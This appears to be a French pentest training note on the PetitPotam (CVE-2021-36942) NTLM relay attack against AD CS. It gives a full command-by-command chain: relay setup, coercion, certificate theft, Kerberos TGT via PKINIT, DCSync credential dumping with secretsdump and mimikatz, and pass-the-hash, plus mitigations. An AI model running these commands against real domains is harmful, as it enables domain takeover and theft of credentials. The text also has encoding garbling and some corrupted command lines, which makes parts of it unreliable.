# PetitPotam (MS-EFSRPC)

### <mark style="color:red;">PetitPotam (MS-EFSRPC)</mark>

PetitPotam (CVE-2021-36942) est une vulnÃ©rabilitÃ© de falsification de lâ€™authentification LSA qui a Ã©tÃ© corrigÃ©e en aoÃ»t 2021.&#x20;

Cette faille permet Ã  un attaquant non authentifiÃ© de forcer un contrÃ´leur de domaine Ã  sâ€™authentifier auprÃ¨s dâ€™un autre hÃ´te en utilisant NTLM sur le port 445 via le protocole **LSARPC** (Local Security Authority Remote Protocol). Pour ce faire, lâ€™attaque exploite le protocole **MS-EFSRPC** (Encrypting File System Remote Protocol) de Microsoft.

Cette technique permet Ã  un attaquant non authentifiÃ© de prendre le contrÃ´le dâ€™un domaine Windows oÃ¹ **Active Directory Certificate Services (AD CS)** est dÃ©ployÃ©. Lâ€™attaque consiste Ã  relayer une demande dâ€™authentification du contrÃ´leur de domaine ciblÃ© vers la page Web dâ€™EnrÃ´lement de lâ€™AutoritÃ© de Certification (CA). Ensuite, lâ€™attaquant soumet une **demande de signature de certificat (CSR)** pour obtenir un nouveau certificat numÃ©rique.

{% hint style="info" %}
ğŸ”¥ <mark style="color:green;">**Objectif de lâ€™attaque**</mark>

Lâ€™attaquant veut obtenir **les droits dâ€™administrateur** sur un rÃ©seau Windows sans connaÃ®tre aucun mot de passe. Pour y arriver, il va **forcer un serveur Ã  sâ€™authentifier ailleurs** et **intercepter ses informations dâ€™identification**.

***

<mark style="color:green;">**Les composants utilisÃ©s dans lâ€™attaque**</mark>

ğŸ“Œ **NTLM (NT LAN Manager)**

* C'est un protocole dâ€™authentification utilisÃ© sur Windows pour vÃ©rifier lâ€™identitÃ© dâ€™un utilisateur ou dâ€™un ordinateur.
* **Exemple rÃ©el** : Imagine que tu appelles ta banque et quâ€™ils te demandent ton numÃ©ro de client avant de te donner des informations. NTLM fonctionne de la mÃªme maniÃ¨re : il Ã©change des informations pour prouver que lâ€™utilisateur est bien qui il prÃ©tend Ãªtre.

ğŸ“Œ **LSARPC (Local Security Authority Remote Protocol)**

* Câ€™est un protocole qui permet aux ordinateurs Windows de communiquer entre eux pour **vÃ©rifier les autorisations** des utilisateurs.
* **Exemple rÃ©el** : Câ€™est comme un agent de sÃ©curitÃ© Ã  lâ€™entrÃ©e dâ€™un bÃ¢timent qui demande ton badge pour voir si tu as le droit dâ€™entrer.

ğŸ“Œ **MS-EFSRPC (Encrypting File System Remote Protocol)**

* Un protocole qui permet Ã  un ordinateur Windows de **chiffrer et dÃ©crypter des fichiers Ã  distance**.
* **Exemple rÃ©el** : Imagine un coffre-fort Ã©lectronique dans une entreprise oÃ¹ seuls les employÃ©s autorisÃ©s peuvent accÃ©der aux documents sensibles.

ğŸ“Œ **AD CS (Active Directory Certificate Services)**

* Un service Windows qui gÃ¨re **les certificats numÃ©riques** (comme une carte dâ€™identitÃ© Ã©lectronique) pour sÃ©curiser les connexions.
* **Exemple rÃ©el** : Câ€™est comme un passeport numÃ©rique qui prouve ton identitÃ© sur un rÃ©seau sÃ©curisÃ©.

ğŸ“Œ **CSR (Certificate Signing Request)**

* Une demande envoyÃ©e pour obtenir un **certificat numÃ©rique** auprÃ¨s dâ€™une autoritÃ© de certification (CA).
* **Exemple rÃ©el** : Câ€™est comme demander une nouvelle carte dâ€™identitÃ© Ã  la mairie.

***

&#x20;<mark style="color:green;">**Comment fonctionne lâ€™attaque ?**</mark>

âœ… **1. Lâ€™attaquant force le serveur Ã  sâ€™authentifier ailleurs (Coercition dâ€™authentification)**

* Lâ€™attaquant envoie une requÃªte malveillante au **ContrÃ´leur de Domaine** (DC) en utilisant **LSARPC** et **MS-EFSRPC**.
* Le serveur DC pense quâ€™il doit rÃ©pondre et envoie **ses informations dâ€™identification** sous la forme dâ€™un **hash NTLM** (mot de passe chiffrÃ©).
* **Exemple rÃ©el** : Imagine que quelquâ€™un tâ€™appelle en se faisant passer pour ton patron et te demande dâ€™envoyer un code secret Ã  une autre personne. Tu obÃ©is sans savoir que câ€™est une arnaque.

***

âœ… **2. Lâ€™attaquant intercepte ces informations et les relaie (NTLM Relay Attack)**

* Lâ€™attaquant utilise un outil comme **ntlmrelayx.py** pour **rediriger** ces informations vers **lâ€™AutoritÃ© de Certification (CA)**.
* **Exemple rÃ©el** : Imagine quâ€™un pirate intercepte ton SMS de validation bancaire et lâ€™envoie Ã  un faux site pour voler ton compte.

***

âœ… **3. Lâ€™attaquant demande un certificat numÃ©rique (CSR)**

* Avec les informations du serveur DC, lâ€™attaquant demande un **certificat numÃ©rique** en son nom.
* Lâ€™AutoritÃ© de Certification (CA) **ne se doute de rien** et gÃ©nÃ¨re un **certificat valide**.
* **Exemple rÃ©el** : Câ€™est comme si quelquâ€™un volait ta carte dâ€™identitÃ© et demandait un passeport en ton nom.

***

âœ… **4. Lâ€™attaquant utilise ce certificat pour obtenir un TGT (Ticket de connexion)**

* Lâ€™attaquant utilise **Rubeus** ou **gettgtpkinit.py** pour demander un **TGT (Ticket Granting Ticket)** au serveur dâ€™authentification Kerberos.
* Ce ticket permet **dâ€™agir comme lâ€™administrateur du rÃ©seau**.
* **Exemple rÃ©el** : Câ€™est comme si un pirate obtenait une carte magnÃ©tique qui ouvre toutes les portes dâ€™un immeuble.

***

âœ… **5. Lâ€™attaquant utilise DCSync pour prendre le contrÃ´le du domaine**

* Avec ce ticket, il peut exÃ©cuter une attaque **DCSync**, qui lui permet **de rÃ©cupÃ©rer tous les mots de passe du rÃ©seau**.
* **Exemple rÃ©el** : Câ€™est comme si un hacker arrivait Ã  pirater un coffre-fort et obtenait les clÃ©s de tous les bureaux dâ€™une entreprise.

***
{% endhint %}

#### <mark style="color:green;">1. PrÃ©paration du relais NTLM vers AD CS</mark>

**But :** Forcer un contrÃ´leur de domaine (DC) Ã  sâ€™authentifier auprÃ¨s du serveur dâ€™Active Directory Certificate Services (AD CS) via le protocole NTLM.

**Commande :**\
Lancer `ntlmrelayx.py` pour Ã©couter les connexions relayÃ©es et rediriger lâ€™authentification vers le serveur Web de lâ€™AD CS.

{% code overflow="wrap" fullWidth="true" %}
```bash
sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController
```
{% endcode %}

_Ce serveur relais attend quâ€™un DC se connecte afin de rÃ©cupÃ©rer une authentification (et ensuite un certificat) via AD CS._

***

#### <mark style="color:green;">2. DÃ©clenchement de lâ€™authentification avec PetitPotam</mark>

**But :** Coercer le DC Ã  sâ€™authentifier sur votre machine, ce qui dÃ©clenche la connexion relayÃ©e.

**Commande (Linux â€“ version Python) :**

```bash
python3 PetitPotam.py <IP_ATTACK_HOST> <IP_DOMAIN_CONTROLLER>
```

_Exemple :_

```bash
python3 PetitPotam.py 172.16.5.225 172.16.5.5
```

**Alternatives :**

* **ExÃ©cutable Windows :** Une version binaire de PetitPotam est Ã©galement disponible pour Windows.
*   **Mimikatz :**

    ```mimikatz
    mimikatzCopyEditmisc::efs /server:<Domain_Controller> /connect:<ATTACK_HOST>
    ```
* **PowerShell :** Utiliser `Invoke-PetitPotam.ps1`.

_Lâ€™attaque exploite la fonction `EfsRpcOpenFileRaw` pour obtenir une rÃ©ponse Â« ERROR\_BAD\_NETPATH Â» qui confirme le succÃ¨s et force le DC Ã  sâ€™authentifier vers vous._

***

#### <mark style="color:green;">3. RÃ©cupÃ©ration du certificat de la machine (DC)</mark>

**But :** GrÃ¢ce au relais NTLM, `ntlmrelayx.py` intercepte lâ€™authentification et rÃ©cupÃ¨re le certificat base64 encodÃ© du compte machine du DC.

_Dans la fenÃªtre oÃ¹ `ntlmrelayx.py` tourne, vous verrez alors apparaÃ®tre une authentification rÃ©ussie, suivie de la gÃ©nÃ©ration du CSR et de la rÃ©cupÃ©ration du certificat (affichÃ© en base64)._

***

#### <mark style="color:green;">4. Obtention dâ€™un Ticket-Granting Ticket (TGT) via PKINIT</mark>

**But :** Utiliser le certificat rÃ©cupÃ©rÃ© pour demander un TGT pour le compte machine du DC.

**Commande :**

{% code overflow="wrap" fullWidth="true" %}
```bash
python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 <CERTIFICAT_BASE64> dc01.ccache
```
{% endcode %}

_Le TGT est sauvegardÃ© dans le fichier `dc01.ccache`._

***

#### <mark style="color:green;">5. Configuration de lâ€™environnement Kerberos</mark>

**But :** Faire en sorte que les outils ultÃ©rieurs utilisent le TGT obtenu.

**Commande :**

{% code fullWidth="true" %}
```bash
export KRB5CCNAME=dc01.ccache
```
{% endcode %}

***

#### <mark style="color:green;">6. RÃ©alisation dâ€™un DCSync avec secretsdump.py</mark>

**But :** Avec le TGT (qui vous authentifie en tant que DC), exÃ©cuter un DCSync pour rÃ©cupÃ©rer les hash NTLM (mot de passe) dâ€™un compte (par exemple, lâ€™administrateur du domaine).

**Commande :**

{% code overflow="wrap" fullWidth="true" %}
```bash
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```
{% endcode %}

_Ou, si lâ€™outil rÃ©cupÃ¨re automatiquement le nom dâ€™utilisateur depuis le ccache :_

{% code fullWidth="true" %}
```bash
secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
```
{% endcode %}

***

#### <mark style="color:green;">7. (Optionnel) Extraction de lâ€™NT Hash via getnthash.py</mark>

**But :** Obtenir lâ€™NT Hash du compte DC en utilisant la clÃ© AS-REP obtenue lors de la demande du TGT.

**Commande :**

{% code fullWidth="true" %}
```bash
python /opt/PKINITtools/getnthash.py -key <AS-REP_ENCRYPTION_KEY> INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$
```
{% endcode %}

***

#### <mark style="color:green;">8. (Optionnel â€“ depuis Windows) Demande de TGT et Pass-The-Ticket (PTT) avec Rubeus</mark>

**But :** Sur un hÃ´te Windows, utiliser le certificat pour demander un TGT et charger immÃ©diatement le ticket en mÃ©moire.

**Commande :**

{% code fullWidth="true" %}
```powershell
.\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:<CERTIFICAT_BASE64> /ptt
```
{% endcode %}

***

#### <mark style="color:green;">9. Confirmation et exploitation des privilÃ¨ges obtenus</mark>

**But :** VÃ©rifier que le ticket est bien importÃ© (par exemple avec `klist`) et utiliser lâ€™accÃ¨s obtenu pour rÃ©aliser dâ€™autres actions (extraction dâ€™informations sensibles, pivot, etc.).

**Exemple dâ€™utilisation avec CrackMapExec :**

```bash
crackmapexec smb 172.16.5.5 -u administrator -H <NTLM_HASH>
```

**Utilisation de Mimikatz pour rÃ©aliser un DCSync (extraction de la hash du compte KRBTGT) :**

```mimikatz
tlsadump::dcsync /user:inlanefreight\krbtgt
```

***

#### <mark style="color:green;">Remarques complÃ©mentaires :</mark>

* **Mitigations :**
  * Appliquer le patch CVE-2021-36942 sur tous les hÃ´tes concernÃ©s.
  * Restreindre et dÃ©sactiver NTLM (par exemple en forÃ§ant lâ€™authentification via HTTPS et en dÃ©sactivant NTLM sur les serveurs AD CS et Domain Controllers).

{% hint style="warning" %}
La dÃ©sactivation (ou la restriction) de NTLM vise Ã  Ã©liminer un vecteur dâ€™attaque connu pour Ãªtre exploitable afin de relayer ou de falsifier des authentifications. ConcrÃ¨tement, voici ce que cela permet :

1. **RÃ©duction des attaques par relais NTLM :**\
   NTLM est un protocole dâ€™authentification hÃ©ritÃ© qui ne propose pas de validation mutuelle robuste. Un attaquant peut ainsi intercepter une authentification NTLM (par exemple, via des outils comme ntlmrelayx ou PetitPotam) et la relayer vers un service (comme AD CS) pour obtenir des accÃ¨s non autorisÃ©s. En dÃ©sactivant NTLM, vous bloquez ce type dâ€™attaque car les authentifications NTLM ne seront plus acceptÃ©es.
2. **Forcer lâ€™usage de protocoles plus sÃ»rs (comme Kerberos) :**\
   Kerberos est le protocole dâ€™authentification par dÃ©faut dans les environnements Windows modernes et offre de meilleures garanties en matiÃ¨re de sÃ©curitÃ©, notamment grÃ¢ce Ã  une meilleure gestion de la mutualisation et des tickets. En forÃ§ant lâ€™authentification via HTTPS et en dÃ©sactivant NTLM, vous vous assurez que seuls des mÃ©canismes dâ€™authentification plus robustes sont utilisÃ©s.
3. **Limitation de la surface dâ€™attaque sur des services sensibles :**\
   Certains services critiques comme AD CS (Active Directory Certificate Services) ou les Domain Controllers peuvent Ãªtre ciblÃ©s via NTLM pour obtenir des certificats ou lancer des attaques de type DCSync. En dÃ©sactivant NTLM sur ces serveurs, vous empÃªchez un attaquant de les utiliser pour forcer une authentification et ensuite exploiter cette connexion relayÃ©e.
{% endhint %}

* Mettre en place des contrÃ´les de dÃ©tection et de durcissement des configurations AD.
* **Impact :** Une fois que lâ€™attaquant a obtenu un accÃ¨s en tant que DC (ou rÃ©cupÃ©rÃ© les hash sensibles via DCSync), il peut rÃ©aliser une compromission totale du domaine (ex : Golden Ticket, persistence, exfiltration, etc.).fi
